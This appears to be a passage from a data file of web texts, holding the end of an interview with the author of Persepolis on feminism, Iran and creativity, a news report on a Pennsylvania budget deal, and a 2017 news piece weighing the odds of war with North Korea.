intelligent, thoughtful. Okay, we cannot run in the same category in the Olympic Games because we don’t have the same muscles. But I see specific festivals—like a female literary\n\nfestival— and I ask, Why on earth does my nipple make me write differently? Or is it my female condition? I read a lot of books written by men talking about women who I cannot identify with.\n\nWe need to be a little bit smarter.\n\nEW: That is really disturbing. What’s coming through, and what I really identify with, is that you really believe in human beings’ autonomy and their own innate power and ability to govern their circumstances. And I think that’s awesome.\n\nMS: The only person who stops you from being free is ourselves. Nobody can take your freedom. I mean, I have lived in a dictatorship. I know what I am talking about.\n\nEW: I was going to say—it is so difficult for those who haven’t experienced it to comment on or imagine what it is like to live in those conditions, but you have the right to say something like that because you really know; you’ve lived it.\n\nMS: I have lived in a dictatorship. There was a ban on everything! Was I less free in my mind? No, I wasn’t. Did I become a stupid person? No, I didn’t. Because no matter how much they looked at me, they could not get into my mind. That belongs to me. And that is under my control if I decide it is. And I can only decide that if I train it. If you don’t use it, it shrinks, and if you use it, it grows. So it is up to us.\n\nWe should not have the limit imposed on us. We should ask ourselves the real questions we face.\n\nAnd I think that women can be and are very, very hard on one another. You know, I turned 30, and in all the interviews I was asked, “Do you have a child?”\n\n“No.”\n\nAnd then again: “Do you have a child?”\n\n“No.”\n\n“Why don’t you have a child?”\n\n“Well, because I don’t want to be anybody’s mother.”\n\nBut as a woman I have to justify myself all the time. And if I want to say, “I want to dedicate my life to my work,” I am called an ambitious bitch!\n\nThey never do that to a man. Never.\n\nAnd who asks me most of these questions? Women.\n\nWe are very, very hard on ourselves, on one another, and, you know, it’s time to consider each other simply as human beings. It’s just a good beginning, I think.\n\nEW: Yeah, it’s a good start. I completely agree. So Uncle Anoosh tells your younger self in the book: “It’s important that you know. Our family memory must not be lost. Even though it’s not easy for you, even if you don’t understand it all.” How much did this idea inform the writing of Persepolis?\n\nMS: Oh, very much so. Forgiveness is a good thing because you cannot go on living your life being angry, because then you become like the people you hate. And that is exactly what is happening in the world that we live in.\n\nOur response to violence is violence. If we start playing the same game as the people whom we accuse, that is very dangerous.\n\nIgnorant people I can forgive, because they’re ignorant. But somebody who knows what he’s doing is bad and does it anyway, that is ten times worse. So I tried to forgive, but I realized when I started writing this book that I was full of so much hate and anger—I wanted to kill everyone! Everybody needed to be punished.\n\nAnd I wrote a couple of pages and I was like: Fuck, I’m exactly like them. I’m exactly like them and that is where they have\n\nsucceeded—to make me like them. So I decided to take my time, to cool down and to understand what happened. And from the moment you understand something, it’s not that you justify it, but you can analyze it better.\n\nAnd so it wasn’t so much a matter of autobiography, because normally an autobiography is a book that you write because you hate your family and your friends and you don’t know how to say it to them, so you write a book and let them read it themselves.\n\nEW: That’s the best description of an autobiography I’ve ever heard!\n\nMS: I didn’t have any other way to write about my story. I could not suddenly say, “Oh, this is an analysis of what happened in the’70s and the ’80s and the ’90s in Iran,” because I am not a historian and I’m not a politician. I’m a person who was born in a certain place, in a certain time, and I can be unsure about everything, but I am not unsure of what I have lived. I know it.\n\nAnd it was very personal—a very small thing, which was important. As soon as you start to talk about a nation, what is a nation? I mean, are all British people the same? Of course not. You have nice\n\npeople—like you. You have hooligans. You have all sorts of people. So one person you—the reader—can identify with; a nation you can’t identify with.\n\nSo I had to create it from a very personal point of view, otherwise it would be this boring, anonymous person. People who tell you “I know.” I don’t know; I just know what I have lived. So I tried to understand and describe my experience, which was important because people know so little. They see images on TV and think, Oh, this is the way it is. And they ask me all sorts of weird questions.\n\n[They laugh]\n\nEW: What’s the most ridiculous question that you’ve been asked about having come from Iran at the time you did? Is there anything really absurd?\n\nMS: Oh, yeah! I was at this conference in Germany and there was this woman who was a Frau Doktor—an educated woman. And she asked me, “In your book you draw that it’s you and your parents in the apartment . . . where is the rest of the family?” And I was like, “What do you mean by the rest of the family? We’re a family of three people, my parents and me, so . . . ”\n\n“Yes you say so, but where are the rest?”\n\nSo she really believed that we had these big tents, with 26 of us living beside one another And she was actually accusing me of lying! And I just thought, Lady, it’s not because you’re ignorant that I am lying. You’re ignorant, and maybe you should know a little bit better.\n\nEW: What?! That’s pretty crazy. But I’m interested because obviously in the West, we project all of these quite strange ideas onto what we think things are like in Iran, or what your life may have been like. Do you think women, and particularly Western women, have blind spots in ways that we are oppressed? Do you think that we are quite judgmental about the cultures but don’t really look into our own and miss things?\n\nMS: Well, I think that the situation of the Western woman is much better. Already being able to dispose of your own body. To decide for yourself. These are really the things that are great. But the culture of our society is very much based on the religious culture. Now, the basis of any religion, monotheistic religion, is that it was Adam and Eve, and God said, “Don’t eat the apple”, and bad Eve said to Adam, “Oh, let’s go and eat the apple.” And nobody just states the fact, “Well, Adam could just tell her no…”\n\nThe story is that Eve had so much more guts, so she tried because she was curious, and Adam followed her like he was a sheep. That was the reality, but it is described as the fault of Eve. So therefore a woman is bad—we are bad. This is it. It is a problem of the image of women, no matter where you go.\n\nIn some countries, they try to cover women up. In other countries, you have to have her naked. When we sell a car, orange juice, or whatever, we will show you a pair of boobs. So it’s a problem with the image of women.\n\nI think that the situation for Western women, of course, is a hundred times better, which is why I came and lived in the West. I can make decisions for myself here. But at the same time, we are far from being equal. Women are still used. Like you use something; we’re an object.\n\nEW: Yes, I agree girls and women have to be able to figure out ways to feel like we’re more empowered.\n\nMS: When a man hits another man, the other man hits him back. This means when someone does something to you physically that you don’t want, then you have the right to defend yourself physically. That is just the basic right. But how many times have people said, “Oh, you are such a savage!” about me. I am not just a savage—a savage goes and beats people up for no reason. I defend myself. But how many times do we really stand up?\n\nAnd in all this imagery of women in films, how many leading roles do we have that are women that are unrelated to the men? She’s always a wife, a mother, a lover, a grandmother. Can’t she just be her?\n\nWe have a long way to go, but I think that is our own decision. We have to bring up our kids telling them, “You are first and foremost human beings.” Your gender matters only when you are in love and when you are with your lover, yes, your gender matters. You can be a woman or a man, whatever you want to be. The rest of the time, just behave like a human being. Full stop.\n\nAnd some feminist movements don’t help because they lack so much humor. In America, you might see bad behavior, and they respond, “Oh, it’s such masculine behavior.” You just think, “Have you really never seen a nasty woman? It has nothing to do with him being a guy.” You know, Simone de Beauvoir said, “You are not born a woman; you become a woman.” And so you are not born a man either—you become a man, as society teaches you how to behave.\n\nThe feminist movement for a long time has been there to cut the guy’s penis off. And this is not a good thing. We cannot make the same mistake as men did with the gentlemen’s clubs—to exclude them. We have to be more intelligent and say, We will make life together with you, we will collaborate, and let’s be together.\n\n. . . I need a new kind of feminism where we are brighter than the stupid men of a century ago and we teach them the lessons. That is how good we can be. Let’s construct this world together. Let’s behave toward each other in a nice way, in a humanistic way, and maybe we can do something better.\n\nEW: I love that and I completely agree with you about humor. It’s everything. The author who we read before Persepolis was English comedian Caitlin Moran, who wrote a book called How to Be a Woman. You know, in some ways it’s seen as quite controversial and there are things that people are very offended by, but—by god—at the very least it has some humor.\n\nMS: And we should have it!\n\nEW: And we need it.\n\nMS: They are so . . .\n\nEW: Serious!\n\nEW: But I think women need to hear that, because growing up, I felt like I was educated a lot that I was going to be in for a shit deal, that being a woman was crap and that being a man would be much better.\n\nAnyway, I’m interested in the growth of social media; I don’t know whether you interact with it at all. Some Iranian millennials are finding refuge in it and using it as a way to express themselves freely. Do you think that is a spark for change? How do you feel about that?\n\nMS: Well, I’m quite skeptical about social media. I remember I was in New York a few years ago and there was a guy who was the chief of new technology from a newspaper. He said, “Oh, you know Facebook enabled them to start the revolution” and all of that. That might be the case, but because of Facebook governments found people and were able to put them in jail, too. As you can communicate with others, they can communicate with you too. I’m extremely scared of Twitter because I think that having to be so brief—just 140 characters—shrinks the mind.\n\nIt’s extremely immediate, so you don’t have time to think, and sometimes we need the time to think. Especially before opening our mouths! So I am not on new media very much—I don’t have Facebook, I don’t have Twitter, I don’t have any of that. I actually need to see people with my eyes. If I don’t see people with my eyes, I cannot smell them, I cannot hear their voice, I cannot know them.\n\n[Laughs]\n\nBut I think it’s possibly a question of generations as well. I see lots of people who take photos, which they put everywhere. If it’s to communicate with journalists, I do understand. For your book club, I do understand. But there is a lot of bullshit too, huh?\n\nEW: There’s a lot of bullshit. I’m constantly fascinated at the moment by the promotion and propagation of a kind of narcissism that I find really strange.\n\nAnyway, Kendra, from my book club, wants to know: “There are many different opinions about the hijab and Islam in regard to feminism; do you feel that either or both the hijab and Islam are anti-feminist?”\n\nMS: I think that any religion is anti-feminist, to start with. Any religion. Christianity, Judaism, every religion. And even Buddhism and Hinduism. This is it—it exists across all religions. It’s a really patriarchal thing.\n\nOn one hand, I hate the veil because they force me to put it on my head and I hate it. On the other hand, who am I to say to somebody who wants to put a scarf on her head, “Don’t do it”?\n\nThis belief is so profound; it is so deep within human beings that when they wanted to ban the veil in France, for example, they thought that I would be with them: “Yeah, yeah! Let’s ban it, let’s do that!”\n\nWell, I don’t think it’s a good idea because you make something that is actually a symbol of repression into a symbol of rebellion. Good job! And in that way it was a big success! There are more and more girls who cover their heads to be rebellious.\n\nAnd I also think there was something inconsistent in the argument, which was that they should be emancipated. But if these girls had to be emancipated, how can they be emancipated if they don’t go to school? If you ban them from school because their family forces them to put on a veil, then you achieve the same result that their families wanted—to not be educated and to marry a cousin from a small town somewhere.\n\nSo instead of going to school and being emancipated, she is 20 and she already has five kids. Another big success! Instead of banning things, you have to have a real dialogue, and if people really believe in something and they want to cover themselves, let them do it. But my question is that: Why is it that 30 years ago we didn’t have many veiled women, and why do we have it today? This is the question.\n\nEW: Why has it gone up? Why is it increasing?\n\nMS: Because, as in France, it’s a question of identity. In France, even after three generations, they call them “the Arabs,” yet when they go to the country of their parents, they are called “the French.” They are respected nowhere, so where and how do they find an identity? In religion.\n\nSo maybe we can offer them another identity, by letting them study, letting them go to the school of the republic, and then they will have the chance to be emancipated. I don’t think you can change anything by either revolutions or the law. The only thing that can change the world is the slow evolution of culture.\n\nIf the culture of a society does not change, you cannot change anything. The thinking seems to have been that because you go and throw bombs in Afghanistan and put in Coca-Cola machines that it suddenly becomes a democracy. Bullshit!\n\nBut who cares about culture? Everybody wants to be elected in two years, which is very short to make change. I don’t even think it’s a question of conviction. It’s not that our politicians were much better than before. It’s just so fast that you have information, then you have new information, and then there is something else on Twitter—it all means there is no time for reflection! We need to take our time to think. The brain of a human being needs some time to digest and to understand. If we don’t take this time we head directly into war. That is where we are going.\n\nEW: So therefore do you think that making art, interacting with culture, is the most revolutionary, the most impactful thing that you can do as a human being? If you believe in the slow evolution of culture?\n\nMS: You know, Emma, I come from Iran, and I never learned any English. I speak English because I watch films. That’s the only way that I have learned it—I have never taken one course of English. It’s enabled me to come from Iran, to live in France, and then make an American movie about a serial killer.\n\nIt means that being born in a certain place doesn’t have to mean coming to think a certain way, though this is still usually the case. Imagine if they put all the money they put into arms, weapons, and wars into something that says: Any person who is a student, who goes to school, needs to have traveled to one other country in the world before the age of 18. Believe me, the world would be a much better place.\n\nAs soon as you know somebody from somewhere else, then it is much more difficult to just consider them as “the enemy” because the person becomes real. It’s not an abstract notion anymore. So I really think that cultural work is extremely, extremely important.\n\nBefore the war even happened in my country, I watched a movie called The Deer Hunter. I was a child—I don’t know why my parents thought it was a good idea to show me this as a child, but in any case they did. I knew then that I was extremely anti-war, because I knew it was not even a question of the war itself, but rather what would happen after the war. All the damage caused.\n\nYou know, that film changed my life. It did. I read a book, it changes my life. I listen to music, it changes my life. Everything that happens to do with the brain has the power to change your life.\n\nYou know why these fundamentalists are so powerful? Because they play with the emotions of people—pressing on the buttons of their emotions. They have people yelling, shouting, and wanting to kill themselves.\n\nBut if you ask people to think, it is something different. As soon as you think, you realize it is really much more complicated than it seems to be. You realize it is much more difficult to become\n\nhyper—to yell, to shout, and to kill yourself if you think about it. So if everybody were to make this little effort just to think, I truly believe it would cool people down.\n\nI think culture is important, but at the same time you could see that during the 1930s you had a lot of intellectuals in Germany, but many of them became Nazis. And why was that? They were humiliated and extremely poor.\n\nSo there needs to be a little base of life for everyone, and then on top of that you have culture—and maybe then we can go in a better direction. However, that will obviously never happen. We are too stupid for that.\n\nSo I think it’s extremely important that we try to change our lives around ourselves. When I was 30 years old, I said, “I’m going to change this world,” and after 10 years, the world was changing me. I became a cynical person who did not believe in anything anymore. And so I said, “I am losing even myself,” and then decided “Okay, from now on I’m going to change myself, and if I change myself, I have changed a little bit of this world. I will try to be a better person.” I don’t always succeed in that because the nasty side of me is big, but I try . . . I try.\n\nEW: I love what you were saying about teaching people to be independent thinkers, because often you get the message in school that you have to learn what’s in your book by heart and be able to regurgitate it. And actually the most important thing I learned in school was how to think, how to decide for myself, how to have an opinion, how to go away and find the answers for things and compare and contrast different answers that people were giving me. So I loved what you said about independent thinking.\n\nI’m also interested in how you self-identify. When someone says, “Where are you from?” or “Are you French?”—where do you sit with all of those types of questions?\n\nMS: There are parts of me that will always be Iranian. These are things that I cannot change. You know, my hospitality will always be Iranian. I’ve been brought up this way. The doors of my house are always open.\n\nI can never become angry with an old person—it’s impossible. This is a very cultural thing; in my culture, no matter what bullshit an old person says, I will always respect and be extremely patient with them. So these are the parts of my culture that I like.\n\nThere are the parts of my culture that are extremely traditional: Men have to do certain things and women have to be virgins and all of that—fuck that. I never believed in it, I refused it, and I rejected it because it is insane.\n\nThere are many things I like very much in the French people: the sense of rebellion, the fact that they are never happy. I love the humor of the British. I love that Americans really want to be nice. They do a lot of nasty things, but their wish is to be nice people. So there are so many different things that I like from different places. I would simply say: I am a human being who tries to do things as she likes, and she’s a very, very lucky person to be able to do that.\n\nI don’t make a big deal out of the fact that I’m an artist, as that is kind of half cool but can also be very pretentious.\n\nBut frankly, I have spoken to so many Iranians and there are really so many times where we speak the same language—my mother tongue—but I don’t understand them. And from everything I’ve seen in the world, I’ve realized it’s not a question of where you come from, it’s a question of intelligence. And intelligence is something you share with some people in the world that is completely independent of the nationality, color, height— all of that.\n\nYou have to find people who have the same sensibility and approach to culture as you, and then it is possible to connect. And therefore I have friends who come from all over the world. I am against the idea of communities. I hate communities. You know, all these people who get together all the Iranians just because of their nationality. I hate that. I cannot choose people by nationality: “He’s an Iranian, so I will like him better.”\n\nIt’s very similar to my thinking on identity. Sometimes at film festivals, people will say, “Oh, we have to vote for her because she is a woman.” And I just think, “She’s a human being who has made a film, so if her film is good we’ll give her a prize. But if it is not good, we are not going to give her a prize and treat her as if she were handicapped.”\n\nIt is not a handicap to be a woman, frankly. So I try to think by myself, which means that sometimes I think that I am above the law because I’m like, “Oh, this law seems very stupid to me, so I won’t apply it.” I give myself that certain kind of freedom. I don’t know why I shouldn’t. And so I am basically a human being who works with what she likes and am a lucky person because of that, I guess.\n\nEW: Are your comics available in Iran? Can you buy them in Iran?\n\nMS: When I was a teenager, I always had the latest music. One week after it was released, we had it on tapes. Everything is available in Iran; it’s just a black market. The more you forbid something, the more people want to see it. The more you say “Don’t do it!” the more people want to do it. Don’t forget the story about Adam and Eve, where they were told do whatever you want, but don’t eat the apple! And of course they ate the apple. That is the nature of the human being.\n\nEW: That must be so hard because, on the one hand, it’s available to you, but on the other hand, you can’t use it in public—it’s like this double life. It’s crazy.\n\nMS: Of course, all of us are somehow schizophrenic because of this double life, but at the same time everything was so exciting. To get the same degree of excitement here, I’d have to go and rob a bank. Then I might have the same degree of adrenaline coursing through me!\n\nEW: Do you think that applies to other circumstances? For example, at the moment there’s this huge debate about whether prostitution should be decriminalized and legalized. Do you think that this still applies?\n\nMS: I am for brothels. One hundred percent. It’s a question of morality against a question of humanity. The people who are against the brothel are moralists. They always give the example of Sweden. My husband is Swedish and I can assure you that there is as much prostitution in Sweden—it’s just on the Web. From the moment that prostitution exists, we have to have brothels so that we can protect these women instead of having a pimp take their money. We have to give them police officers, we have to enable them to deal with their own things and give them retirement after the age of 50. This is a humanistic approach.\n\nThis approach would mean we see these women as human beings and we need to protect them.\n\nThe idea of, “Oh, we are against prostitution” . . . what the fuck? Prostitution has always existed and it’s a very moralistic point of view that has nothing to do with morality. Any woman, any person, any human being who has respect for women also has to respect the prostitute.\n\nHow can you disrespect prostitutes by telling them, “Oh, your job is shit.” Nobody becomes a prostitute because they think it’s fun. It’s most often a sad story of rape, abuse, drugs, et cetera. Can we go backward and start their lives again? No. Governments and our society have to recognize this situation.\n\nSo if we are human beings, what do we do? We protect them. And how do we protect them? By creating spaces for them and not leaving them on highways where they can be beaten, not paid, and even murdered. We legalize brothels. And I hate the idea of prostitution as simply bad. Yes, there are many things that are bad, but it is a reality and how do we deal with reality? With morality? Certainly not. With humanity, yes.\n\nEW: You’ve directed and codirected four films including Persepolis. Is film where you see your future? How are you feeling at the moment? What’s most inspiring you? What are you most wanting to do?\n\nMS: For me, the cinema is a machine of creating empathy. There is no media in the world that can create as much empathy as cinema, because when you read a book, you are always active; when you see a film, you are always passive. As a reader, everything is imposed on you. So you let your emotions go.\n\nAnd also, when I write a book, do you really think that I then read my book and think, Oh! That’s surprising! Of course not, I have written and created it all by myself. But when I make a film there is always an actor who suddenly does something that was not expected, and I’m extremely surprised. At that point I am not a director anymore, but I become the spectator of my own film. Sometimes it’s the production designer who makes a suggestion that I never thought about. So it is a result that is extremely exciting and, yes, surprising for me. It’s very difficult work and right now that is what I like to do. But this is right now; I don’t know about the future. I hope that I will have another two or three lives before I die, as I don’t like to do the same thing all my life. I have lots of hope for myself yet. Maybe I will become a dancer, who knows?\n\nEW: Brilliant! You should.\n\nMS: I basically think that in your life, you have to do what you really want to do in that moment. Having a career plan and so on is no good because sometimes you have a career plan and 10 years later you don’t feel like doing what you planned, because you’ve changed. So I will see, but cinema is very, very inspiring for me because it is so difficult and my brain functions best when I am very stressed. The more my brain is stressed, the more I like it.\n\nEW: Yeah, that’s good. When did you know that you wanted to write your memoir as a graphic novel? When did the idea come to you that you were going to do that?\n\nMS: I found myself saying the same bullshit over and over and facing so many prejudices. It got to the point where I simply thought, I have to put it in a book, because while I like to talk, constantly repeating myself was so tiring. I really didn’t believe anybody would ever read it, but if people asked me questions after I had written it, I could say, “There is a book; you can read it.”\n\nI never thought, never in my life, that anybody would be interested. I didn’t think it was interesting at all—it was just for me. So it became a success, but I never imagined it. But I didn’t have any other choice than to write it—you know how human beings are: The less they know, the more convinced they are. Ignorance gives you this confidence in yourself. As some people were ignorant about how it was, but so confident in their perception, meant I wanted to give them just another point of view. And it became this unplanned, surprise success.\n\nEW: Often comic books are perceived to be “for men” or within a man’s world, and I’m interested in your experience with that. Are people surprised that you, as a woman, wrote a comic book?\n\nMS: Yes, it is! It is a very male thing because the comic arrived at the same time as cinema. It began with the man coming home, sitting on his couch, reading his newspaper and enjoying the strip at the bottom of the page. So that was the beginning of the comic book. The woman on the other hand was supposed to cook, play the piano, sew. So this was leisure designed for men and naturally there were many more men who were interested in it.\n\nAgain, I tell you there are women who say, “Oh, I cannot do it” because they do not believe in themselves, having been told that they cannot do it. My story was different. I ended up in a shared studio in Paris because I could not pay the rent on a studio myself. I also couldn’t work at home, because if I’m at home I just do the laundry, which seems to be an obsession! In the studio, there was a man who actually told me to “write them down.” I always thought that comics were really work for monks, because it is obsessional work—frame after frame. I didn’t think of myself as an obsessive person, but I discovered in this process that I actually am and it suited me for a long time. That’s how I then suddenly discovered cinema and was like, Whoa! I like to be alone, but not for too long—so to work with others? It’s extremely exciting. I need to see and be with other people.\n\nEW: Well in a way comic books are like the perfect training school for film, because that’s what you are doing . . . It’s perfect.\n\nMS: You’re totally right.\n\nEW: I have a question from an Iranian woman who is part of the book club, who wants to know what your hope is for the women and people of Iran and what you think is achievable?\n\nMS: I think lots of things might be achievable because 70 percent of our students are women, which gives me hope. I hear more and more that women—girls—are refusing to marry. Who have decided that you cannot lead a life under the control of your father and then under the control of your husband—decisions that didn’t exist 20 years ago. So as this mentality and culture changes, then we can have real hope. And it is changing. On a historical scale it’s nothing, but in our lifetime it’s something. I would really prefer change for good now, rather than having all this revolution where spilled blood just brings more spilled blood. So I have a lot of hope, yes. I think it’s going be fine.\n\nEW: Did you watch Mustang?\n\nMS: Yes.\n\nEW: Did you like it?\n\nMS: Yes, very much.\n\nEW: You did your comics in saturated black ink, and I’m interested: Why did you choose that? And how do you think that conveys different emotions and atmospheres to other comic styles?\n\nMS: As a literary genre, comics are really connected to fine arts. In comics, with the illustration, you write with your drawing, with your images. So whatever you don’t write, you draw and vice versa. So instead of writing, “Well I was sitting in my bed and I was watching out of the window and the bird was singing” and so on, you just draw all of that. So whatever you draw has meaning that people read. If I use color, it has meaning people read. If I draw backgrounds, the same.\n\nI always thought that what I had to say was too much; it was complicated with lots and lots of words. So I had to go very mellow on the other side because otherwise the rhythm of reading would be destroyed. That’s why I went for something black and white, completely, with an extremely minimalistic emphasis, because I thought that was the best for the rhythm of the reading.\n\nUsually when I paint, I use lots of color. You can draw anything and if you put a little color here and there, it will look nice. It is extremely difficult to work in black and white because you cannot cheat. In black and white, you can make any drawing, you put a little color here and there and it looks nice, it is immediately evident whether it’s good or it’s not good. It actually presented a really difficult challenge: How am I going to make it work in only black and white?\n\nEW: A really good challenge. If this is too personal, please tell me to piss off, but I’m interested in what you do when you feel disillusioned or run-down or tired of having to keep fighting. What keeps you going?\n\nMS: I just walk. I walk and walk. You know, the other day I walked about 28 miles.\n\nEW: Wow!\n\nMS: I walked the whole day and I tried not to think. We have to understand that we have information all over our brain and sometimes you just need to walk so everything finds its place. And then like anyone, every six months I’m sure that I’m over. I’m done. I have nothing else to say. I’m the most boring person in the world. I have that feeling very often, but I walk.\n\nThere have also been so many times—so many times—that human beings who I didn’t even know helped me so much in my life. They just held my hand for a while through life. I try to think about those people—the good people, who are actually the majority of people.\n\nI think about all of that, and you know when I am dead, I am dead. So I have only this one life to live. I cannot just sit and be depressed because, you know, I’m going to die. Very soon. Maybe not tomorrow hopefully, but I’m not going die in 1,000 years. In decades I’ll be dead. And there are things that I want to do, there are things that I want to eat, there are laughs that I have not had. I hope that I will meet lots of new people. I hope that I will have two or three other professions.\n\nIf I can be not too nasty a human being, then I think that is good. Not bad, at least. And I try, you know, I just try. I am very involved with these women’s issues, because I wonder why we don’t believe in ourselves a little bit more. Why do we think that we have to get married to be happy? Why do we think that if we don’t have a boyfriend it’s the end of our world? It isn’t, believe me. It isn’t. Why do we have to always define ourselves by somebody else? Why can’t we just be us?\n\nEW: Someone once told me, as we were talking about, that depression was anger without enthusiasm. And—\n\nMS: I went through a big depression! And do you know what happened? I have to tell you the funniest story. I was so depressed, and when I am depressed I cannot breathe. Breath just doesn’t come to me. So one night I was all alone, and this breathing rhythm comes. That was just before Persepolis, and I called the ambulance and just say, “I cannot breathe.” So they come and put me in aluminum paper like a roasted chicken . . .\n\nEW: Oh, God!\n\nMS: And they put me in this blanket and stretcher and start to carry me down the stairs, which go in circles. I end up falling down, all the way down the stairs, and I broke my head. I needed four stitches! That made me come out of my depression actually. Because I had so much pain there that my breath came back and I decided: Now you have to do something. And then I wrote Persepolis.\n\nEW: That’s so interesting.\n\nMS: If I had not had the four stitches in my head I would have never written it!\n\nEW: And do you think it was just that sometimes you need to be pushed to the edge or . . . ?\n\nMS: We have to accept that we cannot be happy all the time. It’s okay to be sad. It’s okay to cry. It’s okay to be depressed. Sometimes I am depressed—in my pajamas and I put on sad music and start crying. And then I look at myself crying in the mirror, so it makes me cry even more because I’m so sad for myself. And it goes on, but at that moment you have to allow yourself to be sad. We are not robots.\n\nWhen we are alive, we are alive, so I try to do the best. I get depressed very often, but it’s okay. Before, when I was younger, I would worry: “Oh, my God! I am sad.” Now I’m like, “Ah, okay, I am sad.” And so it disappears faster because I am not scared of it anymore.\n\nEW: That’s great. That’s really great. And that’s a perfect ending. This was the most wonderful conversation. You have given me new oomph and I really appreciate that.\n\nMS: I hope that I did not talk too much and I was not too boring for you!\n\nEW: No! You were the opposite of boring. I feel completely energized and empowered as a result of having spoken to you.",

  "latent_26982": "A potential deal to break Pennsylvania's budget stalemate in its fifth month includes a state sales tax increase, expanded school property tax cuts and hundreds of millions of new dollars for public schools, top state lawmakers said Monday.Gov. Tom Wolf's office said the new money for public schools amounted to a record increase, a major priority of his, even if the first-term Democrat had made major concessions in other areas, such as losing his fight to impose a tax on Marcellus Shale natural gas production.It also appeared that Wolf would get at least a portion of the multibillion-dollar state tax increase that he had sought to help correct a long-term deficit and transform a school funding system that harbors huge disparities between rich and poor districts.Meanwhile, the Legislature's huge Republican majorities made headway on their goal of imposing major pension changes for future state and school employees, while plans to privatize some or all of the state-controlled wine and liquor system remained up in the air.Many other crucial details were unresolved Monday and negotiators said a final agreement would not be in place until all of its elements get settled.\"Nothing is agreed to until everything is agreed to,\" said Senate Majority Leader Jake Corman, R-Centre. \"We're trying to put a framework together that will move us forward to get to a final agreement.\"Still, disagreements remained about the extent of settled details. For instance, Wolf's office said it had secured an agreement for $750 million in new dollars over two years for public schools, special education and pre-kindergarten programs. Republican lawmakers disputed some elements of that assertion.The parties did agree, however, that public schools would get $350 million in new money for instruction and operations, a 6 percent increase to about $6.1 billion. Wolf had originally sought $400 million.Ironing out those details and passing legislation could require several more weeks.\"There's a lot of second-, third- and fourth-tier decisions that need to be made,\" said House Majority Leader Dave Reed, R-Indiana.Under the preliminary deal, state spending would rise to $30.7 billion, up about 6 percent from last year's approved budget. It would be boosted by about $500 million in slot-machine gambling revenue that is currently passed along to homeowners as school property tax cuts. That money would be diverted into a restricted account to pay for public school employee pension obligations.The loss of that money for school property tax cuts would be replaced by about $2 billion expected from a state sales tax increase to 7.25 percent, up from the current 6 percent. The rate would rise to 8.25 percent in Allegheny County, where it is currently 7 percent, and to 9.25 percent in Philadelphia, where it is currently 8 percent.Amid staunch Republican opposition, a deal would not include a new tax on Marcellus Shale production that Wolf had sought. Tax increases on cigarettes and on banks were still under discussion.There was no agreement on how new money for schools and property tax cuts would be distributed to each district, an issue that the governor's office has said is of \"critical importance.\" Meanwhile, negotiators were discussing measures to further limit the ability of school boards to raise taxes as part of the package of new money.On pensions, Wolf beat back Republican efforts to entirely end the traditional pension benefit. Instead, newly hired public school and state government employees would get a diminished traditional pension benefit, plus a new, 401(k)-style plan with a 2 percent contribution. The plan would save the state $12.5 billion in the coming decades, Senate officials said.Changes to the state-controlled wine and liquor system were still under discussion, although the sides had agreed to make it part of an overall budget deal.Wolf has stuck by his September counteroffer to hire a private manager to run the system, keeping state ownership, administration officials said. That clashes with the stance of House Republicans, who want the state to end its control of wholesale and retail wine and liquor operations and license private businesses to do it.",

(Photo11: AP)\n\nOne of the most serious issues of 2017 has been what to do about North Korea.\n\nIn September, Kim Jong Un's regime tested a large nuclear weapon underground, claiming it was a hydrogen bomb.\n\nNorth Korea also demonstrated this year that it has the missile technology to deliver its warheads pretty much anywhere in the world.\n\nKim’s regime in Pyongyang has also deployed inflammatory rhetoric, even threatening to bracket the U.S. territory of Guam with missiles.\n\nThe Trump administration has responded with threats of its own, raising fears of a war in Northeast Asia.\n\nMore: Kim Jong Un says he has complete nuclear arsenal and a button on his desk\n\nMore: 2017: A year of terror and North Korea turmoil\n\nMore: South Korea confirms it seized tanker suspected of delivering oil to North Korea\n\nMore: South Korea predicts U.S.-North Korea talks will take place in 2018\n\nFormer CIA director John Brennan has estimated the chance of war at 20-25%, while Richard Haass, president of the Council on Foreign Relations, puts the chance at 50-50%.\n\nOthers are more sanguine, noting that the United States and its allies have not mobilized for war, or even begun moving the masses of weapons platforms, ammunition and other supplies that would be needed to prosecute an all-out conflict.\n\nAlmost everyone agrees a war would be catastrophic, with the potential use of nuclear, chemical and biological weapons that could cause the deaths of millions in North and South Korea, and possibly in China and Japan. The impact on the global economy — and even the climate —could be severe.\n\nNorth Korea says its nuclear weapons program is designed to deter any U.S. attempt at regime change. Many analysts agree. Joseph Cirincione of the Ploughshares Fund argues the world needs to learn to live with a nuclear-armed North Korea, just as the western world contained the Soviet Union during the Cold War.\n\nThere are reports that the Trump administration is considering limited military action. Again, though, those reports could be messaging to convey the appearance of coercive diplomacy to Pyongyang.\n\nPentagon war-gamers have repeatedly found that a limited war with North Korea is not a realistic option, while the player representing North Korea consistently chooses to escalate the conflict in such war games. Most analysts add that conventional weapons are unable to take out underground missile sites, making the only realistic U.S. option for a pre-emptive strike being a nuclear attack.\n\n“I’m going to go with no war (in 2018),” predicts Isaac Stone Fish, an international affairs analyst for PRI’s The World. Stone Fish is a senior fellow with the Asia Society, and a former Newsweek correspondent in Beijing.\n\nHe said his prediction is based “in part because I’m optimistic in the holiday season. And in part because all the sides recognize that they have more to lose with a war than without a war.”\n\nHe believes “cooler heads will prevail.”\n\nStone Fish said it also depends on how you define war. “One could see the likelihood of a small shooting skirmish, with a few soldiers dead on either side, as far more likely.”\n\nHe also points out that North Korea has the capacity to simply ignore an attack. “One can imagine a scenario where the U.S. has a surgical strike on North Korea — I don’t think this is a good idea — but one can imagine them doing so; killing North Korean civilians; killing North Korean soldiers; and Pyongyang decides to just completely cover it up.\"\n\nStone Fish cites as a precedent the exchange of fire between North and South Korea in 2010. “The North Koreans shelled a South Korean island, killing four people. The South Koreans responded; we don’t know exactly how they responded — but presumably, North Koreans died as well. And then the North Koreans basically just dropped it.”\n\nStone Fish has another concern. “My biggest worry,” he said, “is that Trump faces a more serious domestic crisis, feels like he’s really losing the grip of his base, and decides to do something against North Korea to regain popularity.”\n\nBut he said even that is not likely. “I just don’t think he (Trump) or the people around him will ever be in a situation — and again maybe this is just me being hopeful — where they feel their best option, or their only option, is to attack North Korea.”\n\nMORE FROM PRI:\n\nMore: Guatemalans are sending a record amount of money home during Trump’s presidency\n\nMore: What do we really know about Russia and the 2016 election?\n\nMore: As U.S. sanctions keep Western businesses out of Iran, China seizes the opportunity\n\nRead or Share this story: https://usat.ly/2BY8q2I",
